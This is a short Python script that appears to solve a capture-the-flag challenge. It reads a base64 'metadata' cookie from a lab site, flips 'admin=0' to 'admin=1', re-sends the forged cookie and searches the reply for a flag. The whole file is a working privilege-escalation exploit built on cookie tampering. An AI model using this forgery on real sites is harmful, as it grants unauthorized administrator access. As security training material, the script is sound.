import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, find_flag

import base64

URL = "https://sales.quoccacorp.com"

class Solver:
    def __init__(self):
        self.session = get_session()

    def main(self):
        response = self.session.get(URL)
        cookie_metadata_value = response.cookies.get("metadata")
        cookie_metadata_value = cookie_metadata_value.replace('%3D', '=')

        value_decoded = base64.b64decode(cookie_metadata_value).decode()
        value_modified = value_decoded.replace("admin=0", "admin=1")
        value_modified_encoded = base64.b64encode(value_modified.encode()).decode()

        self.session.cookies.clear()
        self.session.cookies.set("metadata", value_modified_encoded)

        response = self.session.get(URL)
        find_flag(response.text)

if __name__ == "__main__":
    Solver().main()